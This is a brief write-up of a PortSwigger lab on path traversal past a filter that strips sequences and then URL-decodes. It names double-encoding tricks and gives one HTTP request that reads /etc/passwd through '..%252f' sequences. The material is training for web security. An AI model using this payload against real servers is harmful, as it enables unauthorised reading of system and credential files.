# 4 - Traversal sequences stripped with superfluous URL-decode

> This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.
>
>  The application blocks input containing [path traversal](https://portswigger.net/web-security/file-path-traversal) sequences. It then performs a URL-decode of the input before using it.
>
>  To solve the lab, retrieve the contents of the `/etc/passwd` file.

 You might be able to use various non-standard encodings, such as `..%c0%af` or `..%252f`, to bypass the input filter.

![](../../.gitbook/assets/imagen%20%28639%29.png)

```text
GET /image?filename=..%252f..%252f..%252f/etc/passwd HTTP/1.1
```



